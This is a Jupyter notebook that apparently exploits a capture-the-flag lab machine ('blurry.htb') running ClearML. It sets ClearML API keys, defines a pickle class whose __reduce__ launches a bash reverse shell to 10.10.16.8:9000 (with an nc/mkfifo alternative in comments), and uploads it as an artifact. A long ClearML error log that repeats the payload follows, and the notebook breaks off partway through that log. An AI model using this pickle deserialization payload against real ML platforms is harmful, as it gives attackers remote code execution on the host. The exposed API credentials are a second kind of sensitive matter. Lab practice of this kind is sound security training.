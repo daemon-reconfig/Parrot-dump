{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "dcde5312-0609-43d5-88c5-bde3ecda5d79",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting clearml\n",
      "  Using cached clearml-1.16.1-py2.py3-none-any.whl.metadata (17 kB)\n",
      "Requirement already satisfied: attrs>=18.0 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (23.2.0)\n",
      "Collecting furl>=2.0.0 (from clearml)\n",
      "  Using cached furl-2.1.3-py2.py3-none-any.whl.metadata (1.2 kB)\n",
      "Requirement already satisfied: jsonschema>=2.6.0 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (4.22.0)\n",
      "Collecting numpy>=1.10 (from clearml)\n",
      "  Using cached numpy-1.26.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (61 kB)\n",
      "Collecting pathlib2>=2.3.0 (from clearml)\n",
      "  Using cached pathlib2-2.3.7.post1-py2.py3-none-any.whl.metadata (3.5 kB)\n",
      "Collecting Pillow>=4.1.1 (from clearml)\n",
      "  Using cached pillow-10.3.0-cp311-cp311-manylinux_2_28_x86_64.whl.metadata (9.2 kB)\n",
      "Requirement already satisfied: psutil>=3.4.2 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (5.9.8)\n",
      "Collecting pyparsing>=2.0.3 (from clearml)\n",
      "  Using cached pyparsing-3.1.2-py3-none-any.whl.metadata (5.1 kB)\n",
      "Requirement already satisfied: python-dateutil>=2.6.1 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (2.9.0.post0)\n",
      "Requirement already satisfied: PyYAML>=3.12 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (6.0.1)\n",
      "Requirement already satisfied: requests>=2.20.0 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (2.32.3)\n",
      "Requirement already satisfied: six>=1.13.0 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (1.16.0)\n",
      "Requirement already satisfied: urllib3>=1.21.1 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (2.2.1)\n",
      "Collecting pyjwt<2.9.0,>=2.4.0 (from clearml)\n",
      "  Using cached PyJWT-2.8.0-py3-none-any.whl.metadata (4.2 kB)\n",
      "Requirement already satisfied: referencing<0.40 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from clearml) (0.35.1)\n",
      "Collecting orderedmultidict>=1.0.1 (from furl>=2.0.0->clearml)\n",
      "  Using cached orderedmultidict-1.0.1-py2.py3-none-any.whl.metadata (1.3 kB)\n",
      "Requirement already satisfied: jsonschema-specifications>=2023.03.6 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from jsonschema>=2.6.0->clearml) (2023.12.1)\n",
      "Requirement already satisfied: rpds-py>=0.7.1 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from jsonschema>=2.6.0->clearml) (0.18.1)\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from requests>=2.20.0->clearml) (3.3.2)\n",
      "Requirement already satisfied: idna<4,>=2.5 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from requests>=2.20.0->clearml) (3.7)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in ./.local/pipx/venvs/jupyterlab/lib/python3.11/site-packages (from requests>=2.20.0->clearml) (2024.6.2)\n",
      "Using cached clearml-1.16.1-py2.py3-none-any.whl (1.1 MB)\n",
      "Using cached furl-2.1.3-py2.py3-none-any.whl (20 kB)\n",
      "Using cached numpy-1.26.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (18.3 MB)\n",
      "Using cached pathlib2-2.3.7.post1-py2.py3-none-any.whl (18 kB)\n",
      "Using cached pillow-10.3.0-cp311-cp311-manylinux_2_28_x86_64.whl (4.5 MB)\n",
      "Using cached PyJWT-2.8.0-py3-none-any.whl (22 kB)\n",
      "Using cached pyparsing-3.1.2-py3-none-any.whl (103 kB)\n",
      "Using cached orderedmultidict-1.0.1-py2.py3-none-any.whl (11 kB)\n",
      "Installing collected packages: pyparsing, pyjwt, Pillow, pathlib2, orderedmultidict, numpy, furl, clearml\n",
      "Successfully installed Pillow-10.3.0 clearml-1.16.1 furl-2.1.3 numpy-1.26.4 orderedmultidict-1.0.1 pathlib2-2.3.7.post1 pyjwt-2.8.0 pyparsing-3.1.2\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install clearml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "6916de01-230d-4d19-8453-2cf43472b580",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: CLEARML_WEB_HOST=http://app.blurry.htb\n",
      "env: CLEARML_API_HOST=http://api.blurry.htb\n",
      "env: CLEARML_FILES_HOST=http://files.blurry.htb\n",
      "env: CLEARML_API_ACCESS_KEY=N8GXRJA7P9THU3ZEJ0NS\n",
      "env: CLEARML_API_SECRET_KEY=4L8a4uzbNulcRfl7ePrgStSYE4ZaDj5qDwpHns7R0dvyoJOmdS\n"
     ]
    }
   ],
   "source": [
    "%env CLEARML_WEB_HOST=http://app.blurry.htb\n",
    "%env CLEARML_API_HOST=http://api.blurry.htb\n",
    "%env CLEARML_FILES_HOST=http://files.blurry.htb\n",
    "%env CLEARML_API_ACCESS_KEY=N8GXRJA7P9THU3ZEJ0NS\n",
    "%env CLEARML_API_SECRET_KEY=4L8a4uzbNulcRfl7ePrgStSYE4ZaDj5qDwpHns7R0dvyoJOmdS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "76957fd4-e85f-4eff-9854-9f968297d4ef",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ClearML Task: created new task id=2cf5fc7f53c54771a01fc227f161ff24\n",
      "2024-06-14 01:23:39,412 - clearml.Task - INFO - Storing jupyter notebook directly as code\n",
      "ClearML results page: http://app.blurry.htb/projects/955606f807f248219120d8c135739630/experiments/2cf5fc7f53c54771a01fc227f161ff24/output/log\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 01:38:42,940 - clearml.Task - WARNING - ### TASK STOPPED - USER ABORTED - STATUS CHANGED ###\n"
     ]
    }
   ],
   "source": [
    "import pickle, os\n",
    "from clearml import Task\n",
    "\n",
    "class RunCommand:\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.16.8/9000 0>&1',))\n",
    "        #使用 os.system 函数执行反弹shell命令，也可以使用/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.12/9000 0>&1\"\n",
    "        #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 9000 >/tmp/f\n",
    "\n",
    "Command = RunCommand()\n",
    "\n",
    "\n",
    "#从 clearml 库导入 Task projects/2b32d52a25f640f58f2c0236b2eea3d2/experiments?columns=selected&columns=type&columns=name&columns=tags&columns=status&columns=project.name&columns=users&columns=started&columns=last_update&columns=last_iteration&columns=parent.name&order=-last_update&filter=类\n",
    "\n",
    "task = Task.init(project_name='she11', task_name='fuckshit', tags=[\"review\"])\n",
    "#初始化一个 ClearML 任务（或者连接到预先存在的任务）\n",
    "\n",
    "#将 command 对象作为一个工件上传，这个对象被序列化为一个 .pkl 文件\n",
    "task.upload_artifact(name='pickle_artifact', artifact_object=Command, retries=2, wait_on_upload=True, extension_name=\".pkl\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "07cf8dec-fabf-457d-8610-2c3b49e9a055",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: CLEARML_WEB_HOST=http://app.blurry.htb\n",
      "env: CLEARML_API_HOST=http://api.blurry.htb\n",
      "env: CLEARML_FILES_HOST=http://files.blurry.htb\n",
      "env: CLEARML_API_ACCESS_KEY=9LA6I5P0DXO5MG26WNXC\n",
      "env: CLEARML_API_SECRET_KEY=KmbnDkAuFJ9dBbc5iRqXs5hZRkyAENHSZO4gxwoWE0kBwQLbYC\n"
     ]
    }
   ],
   "source": [
    "%env CLEARML_WEB_HOST=http://app.blurry.htb\n",
    "%env CLEARML_API_HOST=http://api.blurry.htb\n",
    "%env CLEARML_FILES_HOST=http://files.blurry.htb\n",
    "%env CLEARML_API_ACCESS_KEY=9LA6I5P0DXO5MG26WNXC\n",
    "%env CLEARML_API_SECRET_KEY=KmbnDkAuFJ9dBbc5iRqXs5hZRkyAENHSZO4gxwoWE0kBwQLbYC"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "f112428e-9470-4eef-af9e-6400cb95f022",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ClearML Task: created new task id=de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:05:10,849 - clearml.Task - INFO - Storing jupyter notebook directly as code\n",
      "ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/de637ff757e6401a9b9dfa187a230e38/output/log\n",
      "ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:07:50,778 - clearml.Task - ERROR - Action failed <400/101: tasks.add_or_update_artifacts/v2.10 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38)> (task=de637ff757e6401a9b9dfa187a230e38, artifacts=[{'key': 'pickle_artifact', 'type': 'pickle', 'uri': 'http://files.blurry.htb/Black%20Swan/duck.de637ff757e6401a9b9dfa187a230e38/artifacts/pickle_artifact/pickle_artifact.pkl', 'content_size': 98, 'hash': 'fc5f34cb45dd717937bd0043e53d12d250fd015e327002510a14056efb799962', 'timestamp': 1718348722, 'type_data': {'preview': '<__main__.FuckMe object at 0x7f32b0194790>', 'content_type': 'application/pickle'}}, {'key': 'notebook preview', 'type': 'custom', 'uri': 'http://files.blurry.htb/Black%20Swan/duck.de637ff757e6401a9b9dfa187a230e38/artifacts/notebook%20preview/notebook_de637ff757e6401a9b9dfa187a230e38.html', 'content_size': 286032, 'hash': 'dd983a1c103def0df1511c989f16879e2b1754251702fff1c15e36a3ab0853ad', 'timestamp': 1718348769, 'type_data': {'preview': 'Click `FILE PATH` link', 'content_type': 'text/html'}, 'display_data': [('UPDATE', '2024-06-14 07:06:05')]}, {'key': 'notebook', 'type': 'custom', 'uri': 'http://files.blurry.htb/Black%20Swan/duck.de637ff757e6401a9b9dfa187a230e38/artifacts/notebook/Untitled.ipynb', 'content_size': 10581, 'hash': '2e0e25d98746e55d3f107e437ef4f13e69b16f442891e4bbc85eb5bf56e5c093', 'timestamp': 1718348868, 'type_data': {'preview': 'See `notebook preview` artifact'}, 'display_data': [('UPDATE', '2024-06-14 07:07:46')]}], force=True)\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:07:51,761 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:07:57,027 - clearml.Task - ERROR - Action failed <400/101: tasks.add_or_update_artifacts/v2.10 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38)> (task=de637ff757e6401a9b9dfa187a230e38, artifacts=[{'key': 'pickle_artifact', 'type': 'pickle', 'uri': 'http://files.blurry.htb/Black%20Swan/duck.de637ff757e6401a9b9dfa187a230e38/artifacts/pickle_artifact/pickle_artifact.pkl', 'content_size': 98, 'hash': 'fc5f34cb45dd717937bd0043e53d12d250fd015e327002510a14056efb799962', 'timestamp': 1718348722, 'type_data': {'preview': '<__main__.FuckMe object at 0x7f32b0194790>', 'content_type': 'application/pickle'}}, {'key': 'notebook', 'type': 'custom', 'uri': 'http://files.blurry.htb/Black%20Swan/duck.de637ff757e6401a9b9dfa187a230e38/artifacts/notebook/Untitled.ipynb', 'content_size': 10581, 'hash': '2e0e25d98746e55d3f107e437ef4f13e69b16f442891e4bbc85eb5bf56e5c093', 'timestamp': 1718348868, 'type_data': {'preview': 'See `notebook preview` artifact'}, 'display_data': [('UPDATE', '2024-06-14 07:07:46')]}, {'key': 'notebook preview', 'type': 'custom', 'uri': 'http://files.blurry.htb/Black%20Swan/duck.de637ff757e6401a9b9dfa187a230e38/artifacts/notebook%20preview/notebook_de637ff757e6401a9b9dfa187a230e38.html', 'content_size': 286396, 'hash': '12aa3df40bf71c288089243de81613766ead797c4b72b558e9091b998a2c9e45', 'timestamp': 1718348876, 'type_data': {'preview': 'Click `FILE PATH` link', 'content_type': 'text/html'}, 'display_data': [('UPDATE', '2024-06-14 07:07:51')]}], force=True)\n",
      "2024-06-14 03:07:57,819 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:07:57,823 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n",
      "2024-06-14 03:07:58,627 - clearml.Task - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:07:58,630 - clearml.Task - ERROR - Action failed <400/101: tasks.edit/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38)> (task=de637ff757e6401a9b9dfa187a230e38, force=True, script={'binary': 'python3.11', 'repository': '', 'branch': '', 'version_num': '', 'entry_point': 'Untitled.py', 'working_dir': '.', 'requirements': {'pip': '# Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]\\n\\n', 'conda': ''}, 'diff': '#!/usr/bin/env python\\n# coding: utf-8\\n\\n# In[1]:\\n\\n\\npip install clearml\\n\\n\\n# In[2]:\\n\\n\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_WEB_HOST=http://app.blurry.htb\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_API_HOST=http://api.blurry.htb\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_FILES_HOST=http://files.blurry.htb\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_API_ACCESS_KEY=N8GXRJA7P9THU3ZEJ0NS\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_API_SECRET_KEY=4L8a4uzbNulcRfl7ePrgStSYE4ZaDj5qDwpHns7R0dvyoJOmdS\\')\\n\\n\\n# In[3]:\\n\\n\\nimport pickle, os\\nfrom clearml import Task\\n\\nclass RunCommand:\\n    def __reduce__(self):\\n        return (os.system, (\\'/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.16.8/9000 0>&1\\',))\\n        #使用 os.system 函数执行反弹shell命令，也可以使用/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.12/9000 0>&1\"\\n        #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 9000 >/tmp/f\\n\\nCommand = RunCommand()\\n\\n\\n#从 clearml 库导入 Task projects/2b32d52a25f640f58f2c0236b2eea3d2/experiments?columns=selected&columns=type&columns=name&columns=tags&columns=status&columns=project.name&columns=users&columns=started&columns=last_update&columns=last_iteration&columns=parent.name&order=-last_update&filter=类\\n\\ntask = Task.init(project_name=\\'she11\\', task_name=\\'fuckshit\\', tags=[\"review\"])\\n#初始化一个 ClearML 任务（或者连接到预先存在的任务）\\n\\n#将 command 对象作为一个工件上传，这个对象被序列化为一个 .pkl 文件\\ntask.upload_artifact(name=\\'pickle_artifact\\', artifact_object=Command, retries=2, wait_on_upload=True, extension_name=\".pkl\")\\n\\n\\n# In[1]:\\n\\n\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_WEB_HOST=http://app.blurry.htb\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_API_HOST=http://api.blurry.htb\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_FILES_HOST=http://files.blurry.htb\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_API_ACCESS_KEY=9LA6I5P0DXO5MG26WNXC\\')\\n# get_ipython().run_line_magic(\\'env\\', \\'CLEARML_API_SECRET_KEY=KmbnDkAuFJ9dBbc5iRqXs5hZRkyAENHSZO4gxwoWE0kBwQLbYC\\')\\n\\n\\n# In[2]:\\n\\n\\nimport os, pty, pickle, socket\\nfrom clearml import Task\\nclass FuckMe:\\n    def __reduce__(self):\\n        return(os.system, (\\'/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.16.8/9000 0>&1\"\\',))\\nc = FuckMe()\\n\\nt = Task.init(project_name=\\'Black Swan\\', task_name=\\'duck\\', tags=[\"review\"], output_uri=True)\\nt.upload_artifact(name=\\'pickle_artifact\\', artifact_object=c, retries = 1, wait_on_upload=True, extension_name=\".pkl\")\\n\\ntask.close()\\n# In[ ]:\\n\\n\\n\\n\\n'})\n",
      "2024-06-14 03:07:59,246 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (id=['de637ff757e6401a9b9dfa187a230e38'], only_fields=['last_iteration'], search_hidden=False)\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:08:00,227 - clearml.log - WARNING - failed logging task to backend (2 lines, <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:08:00,708 - clearml.Task - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=2)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:08:00,712 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:08:03,105 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ClearML Monitor: Could not detect iteration reporting, falling back to iterations as seconds-from-start\n",
      "2024-06-14 03:08:35,109 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:08:36,703 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:09:32,108 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:09:32,111 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:09:32,111 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:09:33,382 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:10:02,814 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:10:04,102 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:10:33,681 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:10:35,128 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:11:04,249 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:11:05,841 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:11:33,049 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:11:33,053 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:11:34,813 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:11:35,511 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:11:37,521 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:12:06,169 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:12:07,793 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:12:36,889 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:12:38,423 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:13:07,533 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:13:08,738 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:13:33,199 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:13:34,702 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:13:34,703 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:13:35,449 - clearml.log - WARNING - failed logging task to backend (2 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=2)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:14:02,989 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:14:03,767 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:14:08,967 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=8)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:14:10,404 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:14:34,905 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:14:36,978 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:15:05,638 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:15:07,866 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:15:36,149 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n",
      "2024-06-14 03:15:36,170 - clearml.Task - ERROR - Action failed <400/101: tasks.get_by_id/v1.0 (Invalid task id: id=de637ff757e6401a9b9dfa187a230e38, company=d1bd92a3b039400cbafc60a7a5b1e52b)> (task=de637ff757e6401a9b9dfa187a230e38)\n",
      "2024-06-14 03:15:36,173 - clearml.Task - ERROR - Failed reloading task de637ff757e6401a9b9dfa187a230e38\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:15:38,237 - clearml.log - WARNING - failed logging task to backend (1 lines, <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=1)>)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2024-06-14 03:16:06,869 - clearml.Metrics - ERROR - Action failed <400/131: events.add_batch/v1.0 (Events not added: Invalid task id de637ff757e6401a9b9dfa187a230e38=9)>\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
